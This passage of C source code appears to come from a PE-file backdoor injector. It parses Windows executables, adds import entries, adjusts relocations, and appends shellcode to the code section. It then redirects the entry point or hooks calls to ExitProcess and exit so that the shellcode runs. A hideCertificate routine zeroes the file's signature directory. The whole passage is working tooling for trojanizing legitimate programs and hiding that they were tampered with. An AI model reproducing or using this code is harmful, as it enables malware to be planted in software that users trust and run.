			INSTRUCTION repl[2];
			memset(&repl, 0, 2 * sizeof(INSTRUCTION));
			INSTRUCTION *pushVA = repl;
			INSTRUCTION *jmpToPop = repl + 1;

			setPUSH_IMM32(pushVA, 0x0);
			SET_PUSH_PC(pushVA);
			SET_CONTAINS_VA(pushVA);

			pushVA->directVA = 1;
			pushVA->next = jmpToPop;
			setJMP_REL32(jmpToPop, 0);

			DWORD indexOfPush = call->index;
			DWORD indexOfPop = call->jmp->index + 1; // +1 because we're replacing 1 instruction with 2
			replaceInstr(iHeadPtr, numInstr, repl, indexOfPush);

			pushVA = (*iHeadPtr) + indexOfPush;
			jmpToPop = pushVA->next;
			setJMP_REL32_to(*iHeadPtr, jmpToPop, (*iHeadPtr) + indexOfPop);

			call = NULL;
		}
		for (INSTRUCTION *i = *iHeadPtr; i; i = i->next) // search for call <>.... pop reg
		{
			if (IS_BRANCH_CALL(i) && IS_BRANCH_INT(i))
			{
				INSTRUCTION *pop = i->jmp;
				while (pop && !isPopReg(pop) && // find the next pop reg
					!GET_WRITES(pop, REG_ESP) &&
					!IS_BRANCH_EXT(pop) &&
					!IS_BRANCH_COND(pop))
				{
					if (IS_BRANCH_JMP(pop))
						pop = pop->jmp;
					else
						pop = pop->next;
				}
				if (pop && isPopReg(pop))
				{
					call = i;
					break;
				}
			}
		}
	} while (call);

	// need to have the instructions inserted before we get the size of patch code and VA
	if (atLeastOne)
	{
		DWORD patchCodeSize = 0;
		getCode(*iHeadPtr, &patchCodeSize);
		const DWORD patchVA = getPatchVA(base, patchCodeSize);
		DWORD offset = 0;
		for (INSTRUCTION *i = *iHeadPtr; i; i = i->next)
		{
			offset += i->totalSize; // to next instruction
			if (IS_PUSH_PC(i))
				*((DWORD *)(i->data + i->directVA)) = patchVA + offset + i->next->totalSize;
		}
	}
}

DWORD getFuncVA(LPCVOID base, const char * const funcName)
{
	PE_HEADERS_PTRS headers;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(base, &headers, &dos_header, &nt_header, &section_headers, &num_sections) != 0)
		return 0;

	PIMAGE_DATA_DIRECTORY impDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)ADDR0(impDir->VirtualAddress);
	if (IsBadReadPtr(imp, sizeof(*imp)) || !imp->Name)
		return FALSE;

	int sectIdx = SECT_IDX0(impDir->VirtualAddress);
	DWORD sectionRVA = section_headers[sectIdx].VirtualAddress;
	BYTE *sectionBase = ADDR0(sectionRVA);

#define RVA_TO_PTR(rva) (sectionBase + (rva) - sectionRVA)

	PIMAGE_THUNK_DATA thunkINT, thunkIAT, thunk;
	while (!IsBadReadPtr(imp, sizeof(*imp)) && imp->Name)
	{
		thunkIAT = (PIMAGE_THUNK_DATA)RVA_TO_PTR(imp->FirstThunk);
		thunkINT = (PIMAGE_THUNK_DATA)RVA_TO_PTR(imp->OriginalFirstThunk);
		thunk = imp->OriginalFirstThunk ? thunkINT : thunkIAT;
		for (; !IsBadReadPtr(thunk, sizeof(*thunk)) && thunk->u1.AddressOfData != 0; thunk++, thunkIAT++)
		{
			if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				continue;

			char *name = ((IMAGE_IMPORT_BY_NAME *)RVA_TO_PTR(thunk->u1.AddressOfData))->Name;
			if (!strncmp(name, funcName, strlen(funcName)))
				return nt_header->OptionalHeader.ImageBase + sectionRVA + (BYTE *)thunkIAT - sectionBase;
		}

		imp++;
	}
#undef RVA_TO_PTR
	return 0;
}

/*
 * Will add <delta> to all relocs falling into the RVA range specified.
 * In case of overflow it FALSE will ne returned and all changes will be reverted
 */
BOOL adjustRelocsInRange(
	const LPVOID base, DWORD rvaBegin, DWORD rvaEnd, // both inclusive
	int delta)
{
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(base, 0, 0, &nt_header, &section_headers, &num_sections) != 0)
		return FALSE;

	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	if (!dir->Size)
		return TRUE;

	DWORD sectIdx = SECT_IDX0(dir->VirtualAddress);
	PIMAGE_BASE_RELOCATION origBlock = (PIMAGE_BASE_RELOCATION)getAddressFromRVA(dir->VirtualAddress, 
															base, num_sections, section_headers);
	if (IsBadReadPtr(origBlock, sizeof(*origBlock)) || !(origBlock->SizeOfBlock))
		return FALSE;

	LPVOID buffer = malloc(dir->Size);
	memcpy(buffer, origBlock, dir->Size);
	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)buffer;

	DWORD readBytes = 0, relSectIdx;
	WORD *entry;
	DWORD *ptr_to_value, relRVA, VA, RVA, numEntries;
	BYTE type;
	DWORD imagebase = nt_header->OptionalHeader.ImageBase;
	while (readBytes < dir->Size && !IsBadReadPtr(block, sizeof(IMAGE_BASE_RELOCATION)) &&
		block->VirtualAddress)
	{
		DWORD minRVA = block->VirtualAddress;
		DWORD maxRVA = minRVA + 0x0fff;
		if (maxRVA < rvaBegin || minRVA > rvaEnd)
			goto next_block;

		numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
		for (DWORD i = 0; i < numEntries; i++)
		{
			entry = (WORD *)((char *)block + sizeof(IMAGE_BASE_RELOCATION) + i*sizeof(WORD));
			type = ((*entry & 0xf000) >> 12) & 0x0f;
			if (type != IMAGE_REL_BASED_HIGHLOW &&
				type != IMAGE_REL_BASED_ABSOLUTE)
			{
#ifdef DEBUG_MODE
				puts(" (unknown relocation type) \n");
#endif
				free(buffer);
				return FALSE;
			}
			if (type == IMAGE_REL_BASED_ABSOLUTE) continue;

			int offset = *entry & 0x0fff;
			relRVA = (DWORD)(block->VirtualAddress + offset);
			if (relRVA >= rvaBegin && relRVA <= rvaEnd)
			{
				if (offset + delta < 0 || offset + delta > 0x0fff)
				{
					printf("Error: Overflow when adjusting %dth reloc. (offset: %X) of block with base %08X for RVA range: %08X-%08X, delta: %d\n", 
						i, offset, block->VirtualAddress, rvaBegin, rvaEnd, delta);
					free(buffer);
					return FALSE;
				}
				*entry += delta;
			}
		}

	next_block:
		readBytes += block->SizeOfBlock;
		block = (PIMAGE_BASE_RELOCATION)((char *)block + block->SizeOfBlock);
	}

	memcpy(origBlock, buffer, dir->Size);
	free(buffer);
	return TRUE;
}

// returns the VA of the import
DWORD addImport(LPVOID *base, DWORD *size, const char * const dllName, 
	const char * const funcName, const WORD hint)
{
	DWORD va = getFuncVA(*base, funcName);
	if (va)
		return va;

	PE_HEADERS_PTRS headers;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	if (init(*base, &headers, &dos_header, &nt_header, &section_headers, &num_sections) != 0)
		return 0;

	DWORD dllNameLen = strlen(dllName);
	DWORD funcNameLen = strlen(funcName);

	PIMAGE_BOUND_IMPORT_DESCRIPTOR bimp = getBoundImport(*base, dllName);
	if (bimp)
		bimp->TimeDateStamp -= 1;

	PIMAGE_DATA_DIRECTORY impDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	int sectIdx = SECT_IDX0(impDir->VirtualAddress);
	BYTE *sectionBase = getCopyOfSection(*base, sectIdx);
	DWORD sectionSize = min(section_headers[sectIdx].SizeOfRawData, section_headers[sectIdx].Misc.VirtualSize);
	const DWORD sectionRVA = section_headers[sectIdx].VirtualAddress;
	const DWORD maxSectionRVA = section_headers[sectIdx].VirtualAddress + sectionSize;
	DWORD rvaBegin;
	DWORD extraSize = 2 * sizeof(IMAGE_THUNK_DATA) + sizeof(IMAGE_IMPORT_BY_NAME) + funcNameLen;
	const DWORD maxExtraSize = extraSize + sizeof(IMAGE_IMPORT_DESCRIPTOR) // worst case
		+ sizeof(IMAGE_IMPORT_BY_NAME) + dllNameLen 
		+ 2 * sizeof(IMAGE_THUNK_DATA); // the 2 NULL-terminating DWORDs for IAT and INT arrays in case of adding IMAGE_IMPORT_DESCRIPTOR
	sectionBase = (BYTE *)realloc(sectionBase, sectionSize + maxExtraSize);

#define RVA_TO_PTR(rva) (sectionBase + (rva) - sectionRVA)
	
	PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)RVA_TO_PTR(impDir->VirtualAddress);
	PIMAGE_IMPORT_DESCRIPTOR impBegin = imp;
	if (IsBadReadPtr(imp, sizeof(*imp)) || !imp->Name)
		goto exit_failure;
	PIMAGE_IMPORT_DESCRIPTOR dllImp = NULL;
	DWORD minIATRVA = 0xFFFFFFFF, maxIATRVA = 0, minINTRVA = 0xFFFFFFF, iatLen = 0; // all inclusive
	DWORD minNameRVA = 0xFFFFFFFF, maxNameRVA = 0, maxIDTRVA = impDir->VirtualAddress + impDir->Size - sizeof(IMAGE_THUNK_DATA);
	for (; !(IsBadReadPtr(imp, sizeof(*imp)) || !imp->Name); imp++)
	{		
		if (!strnicmp((char *)RVA_TO_PTR(imp->Name), dllName, dllNameLen))
			dllImp = imp;
		if (imp->FirstThunk < minIATRVA)
			minIATRVA = imp->FirstThunk;
		if (imp->FirstThunk > maxIATRVA)
			maxIATRVA = imp->FirstThunk;
		if (imp->OriginalFirstThunk < minINTRVA)
			minINTRVA = imp->OriginalFirstThunk;

		if (imp->Name < minNameRVA)
			minNameRVA = imp->Name;
		if (imp->Name > maxNameRVA)
			maxNameRVA = imp->Name;
	}
	// calculate length of last block/dll import (in import directory table)
	for (PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)RVA_TO_PTR(maxIATRVA); thunk->u1.AddressOfData; thunk++, iatLen += sizeof(IMAGE_THUNK_DATA));
	maxIATRVA += iatLen; // count NULL terminator
	iatLen = maxIATRVA - minIATRVA;
	DWORD maxINTRVA = minINTRVA + iatLen;

	for (PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)RVA_TO_PTR(minIATRVA); thunk < (PIMAGE_THUNK_DATA)RVA_TO_PTR(maxIATRVA); thunk++)
	{
		if (!thunk->u1.AddressOfData || IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
			continue;
		if (thunk->u1.AddressOfData < minNameRVA)
			minNameRVA = thunk->u1.AddressOfData;
		if (thunk->u1.AddressOfData > maxNameRVA)
			maxNameRVA = thunk->u1.AddressOfData;
	}
	maxNameRVA += sizeof(WORD) + strlen(((PIMAGE_IMPORT_BY_NAME)RVA_TO_PTR(maxNameRVA))->Name); // include null terminator

	DWORD maxRVA = max(max(maxNameRVA, maxIATRVA), maxINTRVA);
	maxRVA = max(maxRVA, maxIDTRVA);

#define ADJ_RVA(rva, piv, sz)	((rva) += (((rva) && (rva) > (piv)) ? (sz) : 0))
#define ADJ_THUNK(t, piv, sz)	((t)->u1.AddressOfData += ((((t)->u1.AddressOfData) && !IMAGE_SNAP_BY_ORDINAL(t->u1.Ordinal)\
															&& (t)->u1.AddressOfData > (piv)) ? (sz) : 0))
#define ADJ_PIID(i, piv, sz)	((i) = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE *)(i) + (((BYTE *)(i) > RVA_TO_PTR(piv)) ? (sz) : 0)))
#define ADJ_ALL(piv, sz)		do {\
									if (piv < impDir->VirtualAddress)\
										impDir->VirtualAddress += (sz);\
									else if ((piv) >= impDir->VirtualAddress && piv <= impDir->VirtualAddress+impDir->Size)\
										impDir->Size += (sz);\
									sectionSize += (sz);\
									ADJ_PIID(impBegin, piv, sz);\
									ADJ_PIID(dllImp, piv, sz);\
									for (imp = impBegin; !(IsBadReadPtr(imp, sizeof(*imp)) || !imp->Name); imp++)\
									{\
										ADJ_RVA(imp->Name, piv, sz);\
										ADJ_RVA(imp->OriginalFirstThunk, piv, sz);\
										ADJ_RVA(imp->FirstThunk, piv, sz);\
									}\
									ADJ_RVA(minINTRVA, piv, sz);\
									ADJ_RVA(maxINTRVA, piv, sz);\
									ADJ_RVA(minIATRVA, piv, sz);\
									ADJ_RVA(maxIATRVA, piv, sz);\
									ADJ_RVA(minNameRVA, piv, sz);\
									ADJ_RVA(maxNameRVA, piv, sz);\
									ADJ_RVA(maxIDTRVA, piv, sz);\
									ADJ_RVA(maxRVA, piv, sz);\
									if (minINTRVA)\
										for (PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)RVA_TO_PTR(minINTRVA); thunk < (PIMAGE_THUNK_DATA)RVA_TO_PTR(maxINTRVA); thunk++)\
											ADJ_THUNK(thunk, piv, sz); \
									if (minIATRVA)\
										for (PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)RVA_TO_PTR(minIATRVA); thunk < (PIMAGE_THUNK_DATA)RVA_TO_PTR(maxIATRVA); thunk++)\
											ADJ_THUNK(thunk, piv, sz);\
								} while(0)


	if (!dllImp) // need to add it to Import Directory Table
	{	
		imp = (PIMAGE_IMPORT_DESCRIPTOR)memmove(imp + 1, imp, sectionBase + sectionSize - (BYTE *)imp - 1);
		memset(imp, 0x0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
		dllImp = imp - 1;
		ADJ_ALL(maxIDTRVA, sizeof(IMAGE_IMPORT_DESCRIPTOR));
		dllImp->ForwarderChain = 0;
		dllImp->TimeDateStamp = 0;

		rvaBegin = sectionRVA + ((BYTE *)dllImp - sectionBase);
		if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_IMPORT_DESCRIPTOR)))
			goto exit_failure;
		

		BYTE *tmp = RVA_TO_PTR(maxINTRVA);
		PIMAGE_THUNK_DATA nullTerm = ((PIMAGE_THUNK_DATA)memmove(
			tmp + 2 * sizeof(IMAGE_THUNK_DATA), tmp + sizeof(IMAGE_THUNK_DATA), sectionBase + sectionSize - tmp - 1)) - 1;
		nullTerm->u1.AddressOfData = 0x0000000;
		ADJ_ALL(maxINTRVA, sizeof(IMAGE_THUNK_DATA));

		rvaBegin = sectionRVA + ((BYTE *)(tmp + sizeof(IMAGE_THUNK_DATA)) - sectionBase);
		if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_THUNK_DATA)))
			goto exit_failure;


		tmp = RVA_TO_PTR(maxIATRVA);
		nullTerm = ((PIMAGE_THUNK_DATA)memmove(tmp + 2 * sizeof(IMAGE_THUNK_DATA), tmp + sizeof(IMAGE_THUNK_DATA), sectionBase + sectionSize - tmp - 1)) - 1;
		nullTerm->u1.AddressOfData = 0x0000000;
		ADJ_ALL(maxIATRVA, sizeof(IMAGE_THUNK_DATA));

		rvaBegin = sectionRVA + ((BYTE *)(tmp + sizeof(IMAGE_THUNK_DATA)) - sectionBase);
		if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_THUNK_DATA)))
			goto exit_failure;


		PIMAGE_IMPORT_BY_NAME dllImpByName = (PIMAGE_IMPORT_BY_NAME)RVA_TO_PTR(maxNameRVA+1);
		if (sectionBase + sectionSize - (BYTE *)dllImpByName > 0) // otherwise its in the end: no need to move it
		{
			memmove(dllImpByName + sizeof(IMAGE_IMPORT_BY_NAME) + dllNameLen, dllImpByName, sectionBase + sectionSize - (BYTE *)dllImpByName - 1);

			rvaBegin = sectionRVA + ((BYTE *)dllImpByName - sectionBase);
			if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_IMPORT_BY_NAME) + dllNameLen))
				goto exit_failure;
		}
		strncpy((char *)dllImpByName, dllName, dllNameLen + 1);
		ADJ_ALL(maxNameRVA+1, dllNameLen + 1);
		maxINTRVA += sizeof(IMAGE_THUNK_DATA);
		maxIATRVA += sizeof(IMAGE_THUNK_DATA);
		dllImp->OriginalFirstThunk = maxINTRVA;
		dllImp->FirstThunk = maxIATRVA;
		dllImp->Name = maxNameRVA + 1;
		maxNameRVA += dllNameLen + 1;
	}
	PIMAGE_THUNK_DATA newIATE = (PIMAGE_THUNK_DATA)RVA_TO_PTR(dllImp->FirstThunk); // point to the beginning
	while (newIATE->u1.AddressOfData) { newIATE++; };
	const DWORD rvaOfLastIAT = dllImp->FirstThunk + (((BYTE *)newIATE) - RVA_TO_PTR(dllImp->FirstThunk));
	newIATE = ((PIMAGE_THUNK_DATA)memmove(newIATE + 1, newIATE, sectionBase + sectionSize - (BYTE *)newIATE - 1)) - 1;
	ADJ_ALL(rvaOfLastIAT, sizeof(IMAGE_THUNK_DATA));

	rvaBegin = sectionRVA + ((BYTE *)newIATE - sectionBase);
	if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_THUNK_DATA)))
		goto exit_failure;


	// a special case when the IMAGE_DEBUG_DIRECTORY+LOAD_CONFIG is placed in the same section after the IAT
	PIMAGE_DATA_DIRECTORY dbgDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG]);
	if (dbgDir->VirtualAddress > rvaOfLastIAT && dbgDir->VirtualAddress < (sectionRVA + sectionSize))
	{
		dbgDir->VirtualAddress += sizeof(IMAGE_THUNK_DATA);
		PIMAGE_DEBUG_DIRECTORY dbgEntry = (PIMAGE_DEBUG_DIRECTORY)RVA_TO_PTR(dbgDir->VirtualAddress);
		DWORD sizeRead = 0;
		while (sizeRead + sizeof(IMAGE_DEBUG_DIRECTORY) <= dbgDir->Size) 
		{
			if (dbgEntry->AddressOfRawData && dbgEntry->AddressOfRawData > rvaOfLastIAT && dbgEntry->AddressOfRawData < (sectionRVA + sectionSize))
			{
				dbgEntry->AddressOfRawData += sizeof(IMAGE_THUNK_DATA);
				if (dbgEntry->PointerToRawData)
					dbgEntry->PointerToRawData += sizeof(IMAGE_THUNK_DATA);
			}

			sizeRead += sizeof(IMAGE_DEBUG_DIRECTORY);
			dbgEntry++;
		}
	}

	PIMAGE_DATA_DIRECTORY cfgDir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG]);
	if (cfgDir->VirtualAddress > rvaOfLastIAT && cfgDir->VirtualAddress < (sectionRVA + sectionSize))
		cfgDir->VirtualAddress += sizeof(IMAGE_THUNK_DATA);


	PIMAGE_THUNK_DATA newINTE = NULL;
	if (minINTRVA) // there are some cases of PEs without INT
	{
		newINTE = (PIMAGE_THUNK_DATA)RVA_TO_PTR(dllImp->OriginalFirstThunk); // point to the beginning
		while (newINTE->u1.AddressOfData) { newINTE++; };
		const DWORD rvaOfLastINT = dllImp->OriginalFirstThunk + (((BYTE *)newINTE) - RVA_TO_PTR(dllImp->OriginalFirstThunk));
		newINTE = ((PIMAGE_THUNK_DATA)memmove(newINTE + 1, newINTE, sectionBase + sectionSize - (BYTE *)newINTE - 1)) - 1;
		ADJ_ALL(rvaOfLastINT, sizeof(IMAGE_THUNK_DATA));

		rvaBegin = sectionRVA + ((BYTE *)newINTE - sectionBase);
		if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_THUNK_DATA)))
			goto exit_failure;
	}

	DWORD newNameRVA = maxNameRVA + 1 + (maxNameRVA + 1) % 2; // usually 2-byte aligned
	PIMAGE_IMPORT_BY_NAME funcImpByName = (PIMAGE_IMPORT_BY_NAME)RVA_TO_PTR(newNameRVA);
	if (sectionBase + sectionSize - (BYTE *)funcImpByName > 0) // otherwise its in the end: no need to move it
	{
		memmove(funcImpByName + sizeof(IMAGE_IMPORT_BY_NAME) + funcNameLen, funcImpByName, sectionBase + sectionSize - (BYTE *)funcImpByName - 1);

		rvaBegin = sectionRVA + ((BYTE *)funcImpByName - sectionBase);
		if (!adjustRelocsInRange(*base, rvaBegin, maxSectionRVA, sizeof(IMAGE_IMPORT_BY_NAME) + funcNameLen))
			goto exit_failure;
	}
	funcImpByName->Hint = hint;
	strncpy(funcImpByName->Name, funcName, funcNameLen + 1);
	if (((DWORD)funcImpByName->Name + funcNameLen + 1) % 2)
	{
		funcImpByName->Name[funcNameLen + 2] = 0;
		funcNameLen++;
	}
	newIATE->u1.AddressOfData = newNameRVA;
	if (newINTE)
		newINTE->u1.AddressOfData = newNameRVA;
	ADJ_ALL(newNameRVA, sizeof(IMAGE_IMPORT_BY_NAME) + funcNameLen);

#undef RVA_TO_PTR
#undef ADJ_RVA
#undef ADJ_THUNK
#undef ADJ_PIID
#undef ADJ_ALL

	if (replacePESection(base, size, sectIdx, sectionBase, sectionSize))
		goto exit_failure;
	return getFuncVA(*base, funcName);

exit_failure:
	free(sectionBase);
	return 0;
}

int patchPEInMemory(LPVOID *base, DWORD *size, PATCH *patch)
{
	/*
	 * 2 main parts here: 
	 *	a) patch-in the code
	 */

	PE_HEADERS_PTRS headers;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_header;
	PIMAGE_SECTION_HEADER section_headers;
	DWORD num_sections;

	int res = 0;
	if ((res = init(*base, &headers, &dos_header, &nt_header, &section_headers, &num_sections)) != 0)
		return res;

	const DWORD imageBase = nt_header->OptionalHeader.ImageBase;
	int codeSecIdx = SECT_IDX0(nt_header->OptionalHeader.AddressOfEntryPoint);
	PIMAGE_SECTION_HEADER codeHdr = &(section_headers[codeSecIdx]);

	// prepare the PATCH structure
	BYTE *code = ADDR0(codeHdr->VirtualAddress);
	REL_REFERENCES *relRefs = getAllRelReferences(code, codeHdr->SizeOfRawData);
	// TODO: getAllRVARefernces to check if there is any pointing to the replacement

	const BOOL fitsInPadding = PATCH_FITS_IN_PADDING(patch, codeHdr);
	if (fitsInPadding)
	{
		patch->codeRVA = codeHdr->VirtualAddress + codeHdr->Misc.VirtualSize;
		patch->targetPoint = code + codeHdr->Misc.VirtualSize;
	}
	else
	{
		patch->codeRVA = codeHdr->VirtualAddress + codeHdr->SizeOfRawData;
		patch->targetPoint = code + codeHdr->SizeOfRawData;

		if (nt_header->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
			puts("[!] WARNING: PE file seems to have relocs stripped and patch needs to extend the .text section. "
				"Any VA references to sections below .text cannot be guaranteed to work"
				" (original PE code might crash after execution of the shellcode)");
	}

	printf("[+] Patch will be written @ RVA:0x%08X, file offset:0x%08X\n", 
		patch->codeRVA, patch->targetPoint - (BYTE *)(*base));

	if (patch->execPt == EXIT)
	{
		if (fitsInPadding || !(nt_header->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED))
		{
			DWORD va;
			if (!patch->entryPoint && (va = getFuncVA(*base, "ExitProcess")))
				hookCallsToVA(*base, patch, va, codeHdr, code, "ExitProcess");
			if (!patch->entryPoint && (va = getFuncVA(*base, "exit")))
				hookCallsToVA(*base, patch, va, codeHdr, code, "exit");
			if (!patch->entryPoint && (va = getFuncVA(*base, "_exit")))
				hookCallsToVA(*base, patch, va, codeHdr, code, "_exit");
			if (!patch->entryPoint && (va = getFuncVA(*base, "_cexit")))
				hookCallsToVA(*base, patch, va, codeHdr, code, "_exit");

			if (!patch->entryPoint)
				puts("[!] Shellcode executes first: no calls to \"exit()\" variant found for entry");
		}
		else
			puts("[!] Shellcode executes first: Relocs stripped AND shellcode does not fit in alignment space");
	}
	
	if (!patch->entryPoint)
	{
		patch->execPt = ENTRY;
		puts("[+] Entry point at [AddressOfEntryPoint]");
		patch->entryPoint = ADDR0(nt_header->OptionalHeader.AddressOfEntryPoint);
		hookPEEntryPoint(patch, relRefs);
		memcpy(patch->entryPoint, patch->jmpto, 5); // "jmp rel32" to patch placed at AddressOfEntryPoint
	}
	puts("[+] Patch built");

	freeRelReferences(relRefs);

	if (!applyOPL(patch))
	{
		puts("[-] Error applying patch: overflow");
		return 4;
	}
	
	const DWORD totalPatchCodeSize = TOTAL_PATCH_SZ(patch);
	if (fitsInPadding)
	{
		assemeblePatch(patch, patch->targetPoint);
		codeHdr->Misc.VirtualSize += totalPatchCodeSize;
		puts("[+] Patch assembled, fits in padding space");
	}
	else
	{
		PIMAGE_SECTION_HEADER section_headers_old = (PIMAGE_SECTION_HEADER)malloc(nt_header->FileHeader.NumberOfSections*sizeof(IMAGE_SECTION_HEADER));
		memcpy(section_headers_old, section_headers, nt_header->FileHeader.NumberOfSections*sizeof(IMAGE_SECTION_HEADER));

		BYTE *buffer = (BYTE *)malloc(totalPatchCodeSize);
		assemeblePatch(patch, buffer);
		puts("[+] Patch assembled, appending to .text section");
		res = appendToPESection(base, size, codeSecIdx, buffer, totalPatchCodeSize, 0xCC);
		free(buffer);
		if (res != 0)
		{
			free(section_headers_old);
			return res;
		}


		// RVA references from the patch code towards higher address need special treatment
		init(*base, &headers, &dos_header, &nt_header, &section_headers, &num_sections);
		const BYTE *patchCode = ADDR0(patch->codeRVA);
		for (DWORD i = 0; i < patch->relocs.count; i++)
		{
			if (patch->relocs.types[i] == INTERNAL) // these should be correct
				continue;

			DWORD rva = *((DWORD *)(patchCode + patch->relocs.offsets[i])) - imageBase;
			if (rva >= patch->codeRVA) // >= the point that the patch was inserted
			{
				DWORD sectIdx = SECT_IDX(rva); // using the old headers
				long delta = section_headers[sectIdx].VirtualAddress - 
					section_headers_old[sectIdx].VirtualAddress;
				*((DWORD *)(patchCode + patch->relocs.offsets[i])) += delta;
			}
		}
		free(section_headers_old);
	}


	/*
	* b) patch-in the new relocations
	*/

	// known issue:	if patch.code VAs "jump" over .reloc section, they will be invalidated
	//				(super-rare for the .reloc section to not be the last)
	// however:		in that case I guess it is somewhat safe to assume that delta(fileSize) 
	//				can be (conditionally) added to the patch.code's VA references
	puts("[+] Adding patch code relocations to .reloc");
	return patchRelocs(base, size, patch);
}

int hideCertificate(LPCVOID base)
{
	PE_HEADERS_PTRS headers;
	if (!getPEHeaders(base, &headers))
	{
		puts("[-] Error parsing the PE headers");
		return 1;
	}

	if (headers.nt_header->OptionalHeader.NumberOfRvaAndSizes < 5)
		return 0;
	PIMAGE_DATA_DIRECTORY dataDir = &(headers.nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]);
	if (dataDir->VirtualAddress)
	{
		dataDir->VirtualAddress = 0;
		dataDir->Size = 0;
		puts("[+] Certificate hidden");
	}
	return 0;
}